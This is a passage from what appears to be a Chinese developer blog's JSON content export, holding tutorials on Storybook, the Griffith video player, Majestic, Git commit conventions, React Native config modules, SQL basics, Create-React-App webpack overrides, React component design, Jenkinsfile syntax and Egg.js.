之前，想要自定义一个组件，往往是： 1 在项目代码里定义。 2 为了不影响项目，使用 CRA 创建一个空项目定义。 但是这样会变得很麻烦，在使用 Storybook 可以完全规避这些麻烦，Storybook 专门用于创建单独 UI 组件而设计。","text":"前言Storybook 是一个开源工具，用于为 React，Vue 和 Angular 单独开发 UI 组件。它使构建令人惊叹的 UI 组织和有效性。 在没有使用 Storybook 之前，想要自定义一个组件，往往是： 1 在项目代码里定义。 2 为了不影响项目，使用 CRA 创建一个空项目定义。 但是这样会变得很麻烦，在使用 Storybook 可以完全规避这些麻烦，Storybook 专门用于创建单独 UI 组件而设计。 简单使用使用 Storybook 非常简单，创建一个空项目，添加依赖即可。 安装模块： 12yarn add --dev babel-loader '@babel/core' '@storybook/react'yarn add react react-dom core-js@3 目录结构： 123456789// 目录可以随便创建，唯一要求的是 .storybook 这个目录名称- .storybook - config.js // 配置文件- static // 静态资源- components - Button.jsx // 自定义组件- stories - index.js // 启动入口- package.json 设置配置： 123456789// .storybook/config.jsimport &#123; configure &#125; from '@storybook/react';function loadStories() &#123; require('../stories/index.js'); // You can require as many stories as you need.&#125;configure(loadStories, module); 创建运行示例： 123456789101112// stories/index.jsimport React from 'react';import &#123; storiesOf &#125; from '@storybook/react';import &#123; Button &#125; from '@storybook/react/demo';storiesOf('Button', module) .add('with text', () =&gt; ( &lt;Button&gt;Hello Button&lt;/Button&gt; )) .add('with emoji', () =&gt; ( &lt;Button&gt;&lt;span role=\"img\" aria-label=\"so cool\"&gt;😀 😎 👍 💯&lt;/span&gt;&lt;/Button&gt; )); 说明： storiesOf 指定组件名称，加了 module 是为了可以热更新。 add 就是右边菜单栏的子菜单，通常一个子菜单对应着组件的一个功能。 运行起来： 1start-storybook 说明： 在右边栏目就是每个组件。 在左边显示的是每个组件的效果。 使用插件Storybook 提供了一系列的插件，例如 addons, actions, knobs 等，具体查看：https://storybook.js.org/addons/ 1234yarn add --dev '@storybook/addons' '@storybook/addon-actions'yarn add --dev '@storybook/addon-knobs' '@storybook/addon-notes'yarn add --dev '@storybook/addon-info' # 文档插件 试一下 addons-actions 插件是怎样的。 1234// 创建文件 .storybook/addons.jsimport '@storybook/addon-actions/register';import '@storybook/addon-knobs/register';import '@storybook/addon-notes/register'; 添加点击动作： 1234567891011import React from 'react';import &#123; storiesOf &#125; from '@storybook/react';import &#123; Button &#125; from '@storybook/react/demo';import &#123; action &#125; from '@storybook/addon-actions';import &#123; withInfo &#125; from '@storybook/addon-info';storiesOf('Button', module) .addDecorator(withInfo) .add('with text', () =&gt; ( &lt;Button onClick=&#123;action('clicked')&#125;&gt;Hello Button&lt;/Button&gt; )); 重启服务，之后点击按钮。 参考资料 https://storybook.js.org","categories":[{"name":"React","slug":"React","permalink":"http://me.lizhooh.com/categories/React/"}],"tags":[{"name":"Javascript","slug":"Javascript","permalink":"http://me.lizhooh.com/tags/Javascript/"},{"name":"React","slug":"React","permalink":"http://me.lizhooh.com/tags/React/"}]},{"title":"React 视频播放组件：Griffith","slug":"React/React/React 视频播放组件","date":"2019-03-30T02:08:22.000Z","updated":"2021-06-15T06:10:52.879Z","comments":true,"path":"/stories/2019/03/React/React/React 视频播放组件/","link":"","permalink":"http://me.lizhooh.com/stories/2019/03/React/React/React 视频播放组件/","excerpt":"前言Griffith 是知乎前端团队开源的一个 React HTML5 视频播放组件，目前已在知乎 web 和 mobile web 内使用，并在 GitHub 上开源。 Griffith 具有的特性： 快捷键支持 - Griffith 参考 YouTube 进行了快捷键支持 状态管理 - Griffith 使用 Context API 进行状态管理。对于 React 应用，可以通过引入 Griffith 的 Context 来实现弹幕等自定义功能。 丰富的事件系统 - 对于视频播放器中常见的首帧时长，缓冲次数等指标，可以通过接收 Griffith 事件来进行打点记录。 支持流式播放 - Griffith 使用了 Media Source Extensions™ ，支持对 mp4 和 m3u8 格式的视频进行流式播放。","text":"前言Griffith 是知乎前端团队开源的一个 React HTML5 视频播放组件，目前已在知乎 web 和 mobile web 内使用，并在 GitHub 上开源。 Griffith 具有的特性： 快捷键支持 - Griffith 参考 YouTube 进行了快捷键支持 状态管理 - Griffith 使用 Context API 进行状态管理。对于 React 应用，可以通过引入 Griffith 的 Context 来实现弹幕等自定义功能。 丰富的事件系统 - 对于视频播放器中常见的首帧时长，缓冲次数等指标，可以通过接收 Griffith 事件来进行打点记录。 支持流式播放 - Griffith 使用了 Media Source Extensions™ ，支持对 mp4 和 m3u8 格式的视频进行流式播放。 var target = document.getElementById('player'); var sources = { hd: { play_url: 'https://zhstatic.zhihu.com/cfe/griffith/zhihu2018_hd.mp4', } , sd: { play_url: 'https://zhstatic.zhihu.com/cfe/griffith/zhihu2018_sd.mp4', }, }; var cover = '/assets/image/2019/3/20190330103113.png'; // 创建播放器 var player = Griffith.createPlayer(target); // 载入视频 player.render({ sources, cover }); 基本使用安装： 1npm install griffith 在 React 里使用： 12345678910111213141516import Player from 'griffith';const sources = &#123; hd: &#123; play_url: 'https://zhstatic.zhihu.com/cfe/griffith/zhihu2018_hd.mp4', &#125;, sd: &#123; play_url: 'https://zhstatic.zhihu.com/cfe/griffith/zhihu2018_sd.mp4', &#125;,&#125;;const App = () =&gt; ( &lt;div style=&#123;&#123; height: 360, width: 640 &#125;&#125;&gt; &lt;Player sources=&#123;sources&#125; /&gt; &lt;/div&gt;); 也可以在非 React 环境使用： 12345678910111213141516171819202122&lt;div id=\"player\"&gt;&lt;/div&gt;&lt;script src=\"https://unpkg.com/griffith-standalone/dist/index.umd.min.js\"&gt;&lt;/script&gt;&lt;script&gt; const target = document.getElementById('player'); const sources = &#123; hd: &#123; play_url: 'https://zhstatic.zhihu.com/cfe/griffith/zhihu2018_hd.mp4', &#125; , sd: &#123; play_url: 'https://zhstatic.zhihu.com/cfe/griffith/zhihu2018_sd.mp4', &#125;, &#125;; // 创建播放器 const player = Griffith.createPlayer(target); // 载入视频 player.render(&#123;sources&#125;); // 销毁视频 player.dispose();&lt;/script&gt; API 文档看这里：griffith API 文档 参考资料 https://zhuanlan.zhihu.com/p/59686274 https://github.com/zhihu/griffith/blob/master/README-zh-Hans.md","categories":[{"name":"React","slug":"React","permalink":"http://me.lizhooh.com/categories/React/"}],"tags":[{"name":"Javascript","slug":"Javascript","permalink":"http://me.lizhooh.com/tags/Javascript/"},{"name":"前端","slug":"前端","permalink":"http://me.lizhooh.com/tags/前端/"},{"name":"React","slug":"React","permalink":"http://me.lizhooh.com/tags/React/"}]},{"title":"Jest 可视化测试 UI：Majestic","slug":"测试/单元测试/Jest 可视化测试 UI：Majestic","date":"2019-03-30T02:04:01.000Z","updated":"2021-06-15T06:10:52.918Z","comments":true,"path":"/stories/2019/03/测试/单元测试/Jest 可视化测试 UI：Majestic/","link":"","permalink":"http://me.lizhooh.com/stories/2019/03/测试/单元测试/Jest 可视化测试 UI：Majestic/","excerpt":"前言Majestic 是一个 Jest 的可视化测试 UI 工具，可以让你通过点点点进行测试你的代码，可以用在 React、React Native、Nodejs 里。","text":"前言Majestic 是一个 Jest 的可视化测试 UI 工具，可以让你通过点点点进行测试你的代码，可以用在 React、React Native、Nodejs 里。 使用全局安装： 1npm install majestic -g 之后在项目根目录下运行： 1majestic 这样就 UI 就跑起来了。 配置1234567891011// package.json&#123; \"majestic\": &#123; // if majestic fails to find the Jest package, you can provide it here. Should be relative to the package.json jestScriptPath: \"../node_modules/jest/bin/jest.js\", // if you want to pass additional arguments to jest, do it here args: [], // environment variables to pass to the process env: &#123;&#125; &#125;&#125; 命令参数 -port - 设置端口。 -debug - 是否开启 debug 模式。 -noOpen - 是否打开 UI（默认 true）。 -version - 查看版本。","categories":[{"name":"测试","slug":"测试","permalink":"http://me.lizhooh.com/categories/测试/"}],"tags":[{"name":"后端","slug":"后端","permalink":"http://me.lizhooh.com/tags/后端/"},{"name":"测试","slug":"测试","permalink":"http://me.lizhooh.com/tags/测试/"}]},{"title":"Git Commit 注释规范","slug":"后端/Git Commit 注释规范","date":"2019-03-22T07:36:56.000Z","updated":"2021-06-15T06:10:52.910Z","comments":true,"path":"/stories/2019/03/后端/Git Commit 注释规范/","link":"","permalink":"http://me.lizhooh.com/stories/2019/03/后端/Git Commit 注释规范/","excerpt":"前言目前，社区有多种 Commit message 的写法规范。下面的本厂的 Git Commit 提交的注释规范要求，请大家养成良好的习惯，严格的遵守规则，谢谢。","text":"前言目前，社区有多种 Commit message 的写法规范。下面的本厂的 Git Commit 提交的注释规范要求，请大家养成良好的习惯，严格的遵守规则，谢谢。 规范提交的格式：type: message，注意中间使用 : 分割（后面带有一个空格），内容不超过 50 字。 type 用于指定提交的 commit 的类别，下面只允许以下几个动词原语。 add - 新增加的功能等描述。 fix - 修复某个 bug 的描述。 update - 在原有的基础上更新代码的描述。 change - 类似 update，唯一区别是 change 是重写了代码（带有颠覆性）。 docs - 更新/新增文档时的描述。 test - 增加/修改测试示例代码。 release - 发布新的版本时使用。 merge - 在解决代码冲突，合并分支时使用。 chore - 构建过程或辅助工具的变动。 create - 初次创建项目时使用。 remove - 移除文件、代码时使用。 type 的作用是为了区分，并且能根据 type 做有效的 commit logger 数据统计。 message 用于指定提交的描述文字，需要注意几个事项。 使用中文表述。 保证有明确的语义化说明。 保证表述内容简短。 以动词开头，比如：更新，增加，修复等。 正确的示例： 12345fix: 修复登录邮箱格式验证错误的问题。update: 优化 Button 组件样式。test: 添加搜索模块的单元测完。release: 发布 v0.1.12 版本。remove: 移除多余的 console.log 代码。 错误的示例： 1234fix: 修复一个大 BUG。 // 表述不清楚。有大多？大 BUG 指的是什么？update: 更新代码。 // 表述不清楚。更新了什么代码，改变了什么功能？添加搜索模块的单元测完。 // 没有写 type。add: 更新 API 文档用户信息接口说明。 // type 使用错误。","categories":[{"name":"后端","slug":"后端","permalink":"http://me.lizhooh.com/categories/后端/"}],"tags":[{"name":"后端","slug":"后端","permalink":"http://me.lizhooh.com/tags/后端/"}]},{"title":"React Native Config 解决方案","slug":"React Native/React Native Config 解决方案","date":"2019-03-20T02:33:45.000Z","updated":"2021-06-15T06:10:52.859Z","comments":true,"path":"/stories/2019/03/React Native/React Native Config 解决方案/","link":"","permalink":"http://me.lizhooh.com/stories/2019/03/React Native/React Native Config 解决方案/","excerpt":"前言在 React Native 里可能会有许多的开发配置项，例如在开发的时候使用的是开发的 api，在上线的时候使用的是线上的地址，除了这样还有测试环境需要的配置项。 通常为了统一管理，可以编写一个 config.js 不同的文件之间引入它，的确这是一种简单常见的方式。今天来看看第三方提供的 React Native Config 解决方案。","text":"前言在 React Native 里可能会有许多的开发配置项，例如在开发的时候使用的是开发的 api，在上线的时候使用的是线上的地址，除了这样还有测试环境需要的配置项。 通常为了统一管理，可以编写一个 config.js 不同的文件之间引入它，的确这是一种简单常见的方式。今天来看看第三方提供的 React Native Config 解决方案。 configreact-native-config 是一个用于在 React Native 中向您的 javascript 代码公开配置变量的模块。 安装： 123456yarn add react-native-configreact-native link react-native-config// android 额外的操作// android/app/build.gradle, 2nd line, add a new apply:apply from: project(':react-native-config').projectDir.getPath() + \"/dotenv.gradle\" 基本的使用方式是，在项目根目录下创建一个 .env 文件，用于配置。 12API_URL = https://myapi.comGOOGLE_MAPS_API_KEY = abcdefgh 在文件里通过全局的引入： 1234import config from 'react-native-config'config.API_URL // 'https://myapi.com'config.GOOGLE_MAPS_API_KEY // 'abcdefgh' 需要注意的是：此模块不会对包装的秘密进行模糊处理或加密，因此请勿将敏感密钥存储在其中 .env。 dotenvreact-native-dotenv 与 react-native-config 类似也是使用 .env 编写配置，其特点是不需要进行原生的链接，通过 babel 预设来解析内容。 安装： 1yarn add react-native-dotenv metro-react-native-babel-preset 在 .babelrc 里添加： 123&#123; \"presets\": [\"module:metro-react-native-babel-preset\", \"module:react-native-dotenv\"]&#125; 基本的使用方式是，在项目根目录下创建一个 .env 文件，用于配置。 12API_URL = https://myapi.comGOOGLE_MAPS_API_KEY = abcdefgh 在文件里通过全局的引入： 1234import config from 'react-native-config'config.API_URL // 'https://myapi.com'config.GOOGLE_MAPS_API_KEY // 'abcdefgh' 在还可以配置生产环境的配置：.env.production。 参考资料 https://github.com/luggit/react-native-config https://github.com/zetachang/react-native-dotenv","categories":[{"name":"React Native","slug":"React-Native","permalink":"http://me.lizhooh.com/categories/React-Native/"}],"tags":[{"name":"学习笔记","slug":"学习笔记","permalink":"http://me.lizhooh.com/tags/学习笔记/"},{"name":"移动开发","slug":"移动开发","permalink":"http://me.lizhooh.com/tags/移动开发/"},{"name":"React-Native","slug":"React-Native","permalink":"http://me.lizhooh.com/tags/React-Native/"}]},{"title":"SQL 基础知识","slug":"Mysql/SQL 基础知识","date":"2019-03-17T14:20:50.000Z","updated":"2021-06-15T06:10:52.829Z","comments":true,"path":"/stories/2019/03/Mysql/SQL 基础知识/","link":"","permalink":"http://me.lizhooh.com/stories/2019/03/Mysql/SQL 基础知识/","excerpt":"前言SQL 是用于访问和处理数据库的标准的计算机语言，具有结构化查询语言，是多种关系式数据库中通用语言。 对于 SQL 的基础知识，可分为对数据库的操作以及对数据表的操作。这些操作都可以分为：数据的插入，数据的更新，数据的查询，数据的删除，也就是所谓的：CURD 操作。","text":"前言SQL 是用于访问和处理数据库的标准的计算机语言，具有结构化查询语言，是多种关系式数据库中通用语言。 对于 SQL 的基础知识，可分为对数据库的操作以及对数据表的操作。这些操作都可以分为：数据的插入，数据的更新，数据的查询，数据的删除，也就是所谓的：CURD 操作。 插入Insert Into 语句用于向表中插入新记录。在插入的过程中，某些列没有提供则会使用默认数据（null）。 1234567891011121314151617Insert Into post (name, url, alexa, country)values ('谷歌', 'https://www.google.com/', 3, 'EN');-- 指定 test 数据库的 post 表Insert Into test.post (name, url, alexa, country)values ('谷歌', 'https://www.google.com/', 3, 'EN');-- 不指定列名，要求插入所有列的数据Insert Into postvalues ('谷歌', 'https://www.google.com/', 3, 'EN');-- 一次性插入多行Insert Into postvalues ('谷歌', 'https://www.google.com/', 3, 'EN'),values ('谷歌', 'https://www.google.com/', 3, 'EN'),values ('谷歌', 'https://www.google.com/', 3, 'EN'),values ('谷歌', 'https://www.google.com/', 3, 'EN'); 查询语法：Select 字段名, 字段名 From 表名。 From 可以查询多个表，使用逗号分隔，可以使用 as 给表起别名。 123456Select user.name From userSelect name From userSelect name From user as uSelect u.name From user as uSelect * From user 条件使用 Where 可以进行条件控制。Where 有以下的操作符：=，&lt;&gt;，&gt;，&lt;，&gt;=，&lt;=，BETWEEN，LIKE，IN。还包括了一些原语的使用 not，in，like，is，or。 Where 不仅可以使用在查询，也可以使用到 Update，Delete，Join 等操作里。 使用 Distinct 可以过滤重复的行数据。 123Select * From post Where country = 'CN';Select * From emp Where sal &gt; 2000 and sal &lt; 3000;Select * From emp Where sal between 1500 and 3000; 子查询在 Where，Having 等条件查询里都可以进行嵌套的子查询，子查询可以进行多维度的嵌套，子查询也可以拆分为具体的单个查询。 1234567891011-- 查询所有比 '小明' 工资高的人的信息，利用子查询，在 Where 里进一步查询得到小明的工资Select * From empWhere sal &gt; (Select sal From emp Where name = '小明')-- 查询所有比职位是 'GM' 并且年龄比 'boss' 的工资高的人的信息Select * From empWhere sal &gt; ( Select sal From emp Where office = 'GM' And age &gt;= ( Select age From emp Where name = 'boss' )); 排序Order By 关键字用于对结果集进行排序，默认是升序（ASC）对记录进行排序。 Desc 或者 Asc 只对它紧跟着的第一个列名有效，其他不受影响，仍然是默认的升序。 12345Select * From post Order By country, alexa;-- 降序Select * From post Order By country Desc;-- 一个降序，一个升序Select * From post Order By country Desc, alexa Asc; 连接使用 Left Join（左连接）、Right Join（右连接）、Inner Join（内连接）、Full Join（全连接） 关键字，可以实现多个表之间的连接查询。 其语法结构为：Select ... From ... Join ... On。On 是指定连接的条件，可以是单个条件也可以是多个条件，可以是模糊的条件。默认 Join 使用的是 Inner 连接。 对于左连接，可以实现查询：① 属于 A 且属于 A 交 B 的数据， ② 属于 A 但不属于 A 交 B 的数据。对于右连接，可以实现查询：① 属于 B 且属于 A 交 B 的数据， ② 属于 B 但不属于 A 交 B 的数据。对于内连接，可以实现查询：① 属于 A 交 B 的数据。对于全连接，可以实现查询：① 属于 A 且属于 B 的数据。② 属于 A 和 B，但不属于 A 交 B 的数据。 Inner Join：如果表中有至少一个匹配，则返回行。Left Join：即使右表中没有匹配，也从左表返回所有的行。Right Join：即使左表中没有匹配，也从右表返回所有的行。Full Join：只要其中一个表中存在匹配，则返回行。 123Select a.id, a.name, b.count, b.dateFrom post as a Inner Join logs as bOn a.id=b.postId; 关于 SQL 连接的一些深度理解，可以查阅这篇文章：图解 SQL JOIN 聚合SQL 里提供了许多聚合函数，可用于统计，计数方面。 比较常见的使用有：Group By，Having，count，max/min，avg，sum。 Group By 语句用于结合聚合函数，根据一个或多个列对结果集进行分组。Group By 在 Select 之后使用，对查询的结果进行分组，因此也在 Join 之后使用。 12345678910111213+-----+---------+-------+------------+| aid | siteId | count | date |+-----+---------+-------+------------+| 1 | 1 | 45 | 2016-05-10 || 2 | 3 | 100 | 2016-05-13 || 3 | 1 | 230 | 2016-05-14 || 4 | 2 | 10 | 2016-05-14 || 5 | 5 | 205 | 2016-05-14 || 6 | 4 | 13 | 2016-05-15 || 7 | 3 | 220 | 2016-05-15 || 8 | 5 | 545 | 2016-05-16 || 9 | 3 | 201 | 2016-05-17 |+-----+---------+-------+------------+ 123-- 统计 log 各个 siteId 的访问量Select siteId as ID, sum(log.count) as 访问量 From logGroup By siteId; Having 子句可以让我们筛选分组后的各组数据。Group By 之后不能使用 Where 进行条件的筛选，只能使用 Having。 1234-- 统计 log 各个 siteId 的访问量，过来小于 100 的行Select siteId as ID, sum(log.count) as 访问量 From logGroup By siteIdHaving sum(log.count) &gt; 100; 更新Update ... Set ...Where 语句用于更新表中的记录。 123-- 更新 name 为 谷歌的，行数据Update post Set alexa=5, country='EN'Where name='谷歌'; 注意：如果忽略了 Where，则会更新所有的行数据。 删除Delete 语句用于删除表中的记录。 12345-- 在表里删除某一行Delete From postWhere name='谷歌' and country='EN';-- 删除表所有行Delete * From table_name; 小结好了，SQL 的基础就这么多，其他的可以使用可视化的 SQL 界面进行操作。实际上在日常的使用了，很多操作都可以使用可视化的界面操作进行。SQL 的编写可以是很简单，也可以是","categories":[{"name":"Mysql","slug":"Mysql","permalink":"http://me.lizhooh.com/categories/Mysql/"}],"tags":[{"name":"数据库","slug":"数据库","permalink":"http://me.lizhooh.com/tags/数据库/"},{"name":"MongoDB","slug":"MongoDB","permalink":"http://me.lizhooh.com/tags/MongoDB/"},{"name":"Mysql","slug":"Mysql","permalink":"http://me.lizhooh.com/tags/Mysql/"}]},{"title":"Create-React-App 自定义配置（重写 Webpack）","slug":"React/React/Create-React-App 自定义配置","date":"2019-03-11T08:40:47.000Z","updated":"2021-06-15T06:10:52.874Z","comments":true,"path":"/stories/2019/03/React/React/Create-React-App 自定义配置/","link":"","permalink":"http://me.lizhooh.com/stories/2019/03/React/React/Create-React-App 自定义配置/","excerpt":"前言在使用 Create-React-App 创建的项目，文件结构非常的简洁，但是有时候我们需要自己添加或修改一些 Webpack 配置，这时候可以使用 npm run eject 把 Webpack 的配置全部导出来。但是有时候并不想这样做，所以能不能使用不改变目录结构的方式呢？答案是可以的，下面就来看看怎么配置。 更多的了解可以查看官方的文档：create-react-app doc","text":"前言在使用 Create-React-App 创建的项目，文件结构非常的简洁，但是有时候我们需要自己添加或修改一些 Webpack 配置，这时候可以使用 npm run eject 把 Webpack 的配置全部导出来。但是有时候并不想这样做，所以能不能使用不改变目录结构的方式呢？答案是可以的，下面就来看看怎么配置。 更多的了解可以查看官方的文档：create-react-app doc 使用 react-app-rewiredreact-app-rewired 可以说是一个比较出名并且早的一个重写 CRA 配置的一个库了，不过现在已经不维护的，CRA 已经更新到 3.0 了，与 2.x 有点不同。 重写 Webpack 配置重写 Webpack 的配置，使用到了 react-app-rewired，这是一个专门用于重新 create-react-app 的配置的。 react-app-rewired 的原理就是在启动了时候会读取 config.overrides 的配置项以及 react-scripts 的配置项，然后做一个合并，最后实际上是运行 react-scripts 的命令。 1yarn add react-app-rewired --dev 安装完成后，替换现有的 npm scripts 命令： 12345\"scripts\": &#123; \"start\": \"react-app-rewired start\", \"build\": \"react-app-rewired build\", \"test\": \"react-app-rewired test --env=jsdom\"&#125; 之后在项目目录下添加 config-overrides.js 文件。 在 config-overrides.js 里提供了 env 和 webpack config 的参数。你可以在这里使用 Nodejs 执行一些预操作，甚至是配置 less/scss。 1234/* config-overrides.js */module.exports = function override(config, env) &#123; return config;&#125; 配置 Less 在 react-scripts 1.x 直接安装 less less-loader 就可以实现加载 less，而 2.x 反而无效，此问题待研究。 以下是 react-scripts 2.x 添加 less 的办法，因为 1.x 自带 less 了。 配置 less/scss 有两种，一种是在 webpack 里设置，另外一种是在 config-override.js 里添加自动监听文件变化的编译。 现在介绍在 webpack 里设置的方法。 1yarn add less less-loader --dev 1234567891011121314151617module.exports = function override(config, env) &#123; //do stuff with the webpack config... console.log(config.module); const rules = config.module.rules; rules[rules.length - 1].oneOf.push(&#123; test: /.less$/, exclude: /\\.module\\.less$/, loader: require.resolve('less-loader'), options: &#123;&#125;, &#125;); config.module.rules = rules; // process.exit(0); return config;&#125; 配置 Scss在 react-scripts@2.0.0 或更高的版本里，官方已经添加了对 scss 的支持，因此，安装 node-sass 或 sass 即可。 1yarn add node-sass --dev Webpack 提取公共模块create-react-app 的默认行为是把所有包的打包在一起。有时候需要把一些公共模块抽离出来单独打包，这时候使用修复 webpack 的 entry 配置。 下面代码展示了把 react 等模块都打包在 vendor.js 里，而其他业务代码则打包在 app.js 里。 12345678910111213141516171819202122232425262728293031const webpack = require('webpack');module.exports = function override(config, env) &#123; // 加个别名路径 config.resolve.alias = &#123; ...config.resolve.alias, '@': path.join(__dirname, './src'), &#125;; // 修改出口 config.entry = &#123; app: config.entry, vendor: [ 'react', 'react-dom', 'react-router-dom', 'redux', 'react-redux', 'styled-components', ], &#125;; // 提取公共模块 config.plugins.push(new webpack.optimize.CommonsChunkPlugin(&#123; name: 'vendor', filename: 'vendor.[hash:8].js' &#125;)); return config;&#125;; IE polyfill默认是不包含 polyfill，因此需要手动安装。 1yarn add react-app-polyfill 1import 'react-app-polyfill/ie9'; 使用 cracocraco 是另外一个新秀，其特点就是更新跟进，支持 CRA 3.x，下面来看看怎样用。 安装： 1yarn add @craco/craco 用法跟 react-app-rewired 差不多，craco 使用的是 craco.config.js 文件。 12345module.exports = (&#123; env &#125;) =&gt; &#123; return &#123; ... &#125;;&#125; 并且需要更改 npm script： 123456\"scripts\": &#123; \"start\": \"craco start\", \"build\": \"craco build\", \"test\": \"craco test\", \"eject\": \"craco eject\"&#125;, 其配置对象内容看这里：craco#configuration-overview 参考资料 https://www.npmjs.com/package/react-app-rewired https://facebook.github.io/create-react-app/ https://www.jianshu.com/p/a46e30d7ef39 https://github.com/facebook/create-react-app/blob/master/packages/react-app-polyfill/README.md","categories":[{"name":"React","slug":"React","permalink":"http://me.lizhooh.com/categories/React/"}],"tags":[{"name":"Javascript","slug":"Javascript","permalink":"http://me.lizhooh.com/tags/Javascript/"},{"name":"前端","slug":"前端","permalink":"http://me.lizhooh.com/tags/前端/"},{"name":"React","slug":"React","permalink":"http://me.lizhooh.com/tags/React/"}]},{"title":"浅谈 React 组件设计","slug":"React/React/浅谈 React 组件设计","date":"2019-03-09T08:34:04.000Z","updated":"2021-06-15T06:10:52.880Z","comments":true,"path":"/stories/2019/03/React/React/浅谈 React 组件设计/","link":"","permalink":"http://me.lizhooh.com/stories/2019/03/React/React/浅谈 React 组件设计/","excerpt":"前言React 说到底也只是通过程序提供的工具，仅仅是工具，而且是受到一些程序限制的工具。实际业务当中遇到的各种各样的抽象，我认为是另一个纬度的东西。React 的设计足够灵活，但未必意味着适合做全部的抽象。而组件的问题并不是 React 带来或者能解决的问题，而是所有程序面临的问题。","text":"前言React 说到底也只是通过程序提供的工具，仅仅是工具，而且是受到一些程序限制的工具。实际业务当中遇到的各种各样的抽象，我认为是另一个纬度的东西。React 的设计足够灵活，但未必意味着适合做全部的抽象。而组件的问题并不是 React 带来或者能解决的问题，而是所有程序面临的问题。 组件类型根据 React 提供的创建组件 API，组件为分为三大类型： 纯函数组件（无状态） 类组件（有状态） Hooks 组件（有状态） 根据组件的应用场景，可分为几大类型： 布局组件 展示组件 容器组件 模态组件 页面组件 类型 作用 布局组件 一般无状态，编写好布局结构通过 children 或 render props，导入外部组件。 展示组件 一般无状态，数据来源来自于 props，只关心得到数据后如何渲染，具有很强的内聚性。 容器组件 一般有状态，负责对接后端的 api 数据，连接 redux 的 store，知道数据的形态以及数据从何而来，知道数据如何运作，包含逻辑层控制，通常容器组件下面就是展示组件。 模态组件 弹窗使用的组件，由于。 页面组件 对应着，某个页面的组件，在页面组件里会包含着布局组件，容器组件，模态组件，展示组件等。负责整个页面的功能，逻辑处理，后端 api 对接，可以连接 redux。 未完 …","categories":[{"name":"React","slug":"React","permalink":"http://me.lizhooh.com/categories/React/"}],"tags":[{"name":"前端","slug":"前端","permalink":"http://me.lizhooh.com/tags/前端/"},{"name":"React","slug":"React","permalink":"http://me.lizhooh.com/tags/React/"}]},{"title":"Jenkinsfile 编写说明","slug":"前端/Jenkinsfile 编写说明","date":"2019-02-27T13:00:04.000Z","updated":"2021-06-15T06:10:52.903Z","comments":true,"path":"/stories/2019/02/前端/Jenkinsfile 编写说明/","link":"","permalink":"http://me.lizhooh.com/stories/2019/02/前端/Jenkinsfile 编写说明/","excerpt":"前言Jenkinsfile 是 jenkins 执行任务的描述文件。在大多时候会在项目里创建一个 Jenkinsfile 文件，让一些项目管理工具（coding、github 等）可以根据 Jenkinsfile 进行持续部署。 基本语法Jenkinsfile 使用类似 js 对象的语法。在下面的代码里很明显了说明了 jenkins 的任务有三个阶段，分别是：build，test，deploy。 在步骤里使用 stage 表明每个阶段名称，使用 steps 定义每个步骤。在一个阶段里可以有多个步骤。","text":"前言Jenkinsfile 是 jenkins 执行任务的描述文件。在大多时候会在项目里创建一个 Jenkinsfile 文件，让一些项目管理工具（coding、github 等）可以根据 Jenkinsfile 进行持续部署。 基本语法Jenkinsfile 使用类似 js 对象的语法。在下面的代码里很明显了说明了 jenkins 的任务有三个阶段，分别是：build，test，deploy。 在步骤里使用 stage 表明每个阶段名称，使用 steps 定义每个步骤。在一个阶段里可以有多个步骤。 在步骤里使用 echo 向控制台输出信息，使用 sh 执行命令行。例如下面的两个 sh 是 npm 的执行命令。 1234567891011121314151617181920212223pipeline &#123; agent any stages &#123; stage('Build') &#123; steps &#123; echo 'Building..' sh 'npm install' sh 'npm run build' &#125; &#125; stage('Test') &#123; steps &#123; echo 'Testing..' &#125; &#125; stage('Deploy') &#123; steps &#123; echo 'Deploying....' &#125; &#125; &#125;&#125; 可以使用 ${} 的语法使用环境变量。在 environment 里设置环境变量。 123456789stage('Deploy') &#123; environment &#123; CC = 'clang' &#125; steps &#123; echo 'Deploying....' echo \"Running $&#123;env.BUILD_ID&#125; on $&#123;env.JENKINS_URL&#125;\" &#125;&#125; 可以使用 parameters 设置一些参数变量。 12345678910111213pipeline &#123; agent any parameters &#123; string(name: 'Greeting', defaultValue: 'Hello', description: 'How should I greet the world?') &#125; stages &#123; stage('Example') &#123; steps &#123; echo \"$&#123;params.Greeting&#125; World!\" &#125; &#125; &#125;&#125; Jenkinsfile 的编写大概就这么多内容。 一些注意事项 不要在 jenkins 里执行一些不合结束的命令，这样会导致整个持续部署永无终止。 有些需要权限的命令记得开启权限。 参考资料 https://jenkins.io/zh/doc/book/pipeline/jenkinsfile/","categories":[{"name":"前端","slug":"前端","permalink":"http://me.lizhooh.com/categories/前端/"}],"tags":[{"name":"前端","slug":"前端","permalink":"http://me.lizhooh.com/tags/前端/"}]},{"title":"Egg 开发那些事","slug":"Nodejs/Egg/Egg 开发那些事","date":"2019-02-26T12:26:48.000Z","updated":"2021-06-15T06:10:52.832Z","comments":true,"path":"/stories/2019/02/Nodejs/Egg/Egg 开发那些事/","link":"","permalink":"http://me.lizhooh.com/stories/2019/02/Nodejs/Egg/Egg 开发那些事/","excerpt":"前言Egg.js 是阿里开源的一个企业级 Nodejs 开发框架。Egg.js 为企业级框架和应用而生，我们希望由 Egg.js 孕育出更多上层框架，帮助开发团队和开发人员降低开发和维护成本。Egg 继承于 Koa，与 Koa 不同的是 Egg 看起来更像框架，而 Koa 更像是库。","text":"前言Egg.js 是阿里开源的一个企业级 Nodejs 开发框架。Egg.js 为企业级框架和应用而生，我们希望由 Egg.js 孕育出更多上层框架，帮助开发团队和开发人员降低开发和维护成本。Egg 继承于 Koa，与 Koa 不同的是 Egg 看起来更像框架，而 Koa 更像是库。 创建项目创建一个 Typescript 的项目。 1egg-init myapp --type ts 在创建完成后，在 app 目录里有以下的结构。这些目录名字是固定的，不能修改。 12345- app - controller - model - service - public 固定目录 config - 用于设置应用的各种配置，在项目根目录下的 config 目录。 middleware - 应用的中间件，在 app/middleware 目录里。 router - 用于配置应用的路由映射关系，在 app/router.js 文件里。 controller - 即控制器，在 app/controller 目录里。 service - 即业务层的抽象，在 app/service 目录里。 schedule - 定时任务，在 app/schedule 目录里。 extend - 自定义的扩展，在 app/extend 目录里。 helper - 自定义的助手函数，在 app/extend/helper.js 里。 request - 对请求的额外处理函数，在 app/extend/request 里。 response - 对响应的额外处理函数，在 app/extend/response 里。 context - 对上下文额外处理函数，在 app/extend/context 里。 application - 对应用额外处理函数，在 app/extend/application 里。 agent - 对代理额外处理函数，在 app/extend/agent 里。 中间件Egg 的中间件写法与 Koa 无差异，基本都是 (ctx, next) 的中间件函数写法。 现在，尝试把 koa-logger 集成到 Egg 的中间件里。首先是创建 middleware 目录，并创建一个 logger 文件。 123// app/middleware/loggerimport * as logger from 